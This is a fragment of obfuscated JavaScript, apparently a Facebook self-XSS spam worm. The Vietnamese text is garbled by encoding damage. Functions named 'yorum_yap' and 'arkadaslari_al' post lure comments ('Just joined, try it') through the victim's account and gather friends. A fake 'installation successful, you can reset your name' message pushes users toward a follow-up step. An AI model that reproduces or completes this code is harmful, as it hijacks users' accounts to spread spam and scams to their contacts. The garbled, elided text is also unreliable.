...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/phamdoanhieu" target="_blank">CÃ€I Äáº¶T THÃ€NH CÃ”NG! Báº¡n cÃ³ thá»ƒ thiáº¿t láº­p láº¡i tÃªn trong vÃ i ngÃ y tá»›i, vui lÃ²ng kÃ­ch chuá»™t vÃ o Ä‘Ã¢y Ä‘á»ƒ thá»±c hiá»‡n cÃ´ng Ä‘oáº¡n hoÃ n táº¥t sau 5 phÃºt vÃ  khÃ´ng quÃ¡ 60 phÃºt ká»ƒ tá»« khi Ä‘á»c thÃ´ng bÃ¡o nÃ y. á»¨ng dá»¥ng sáº½ báº¯t Ä‘áº§u tÃ­nh thá»i gian chá» ngay sau khi báº¡n hoÃ n thÃ nh bÆ°á»›c hoÃ n táº¥t. á»¨ng dá»¥ng Ä‘Æ°á»£c phÃ¡t triá»ƒn bá»Ÿi Cá»™ng Ä‘á»“ng IT Viá»‡t.<br>IT VIá»†T</a>';
	html += '</div>';
...
var spage_id = "217027901811109";
var spost_id = "100003233445615";
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text=(Y) Vá»«a tham gia xong ðŸ˜ ðŸŒ¹ CÃ¡c Báº¡n LÃ m Thá»­ Äi ðŸ’– ðŸŽ ðŸ’‹ ðŸ’ â˜•' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(468378513264338);
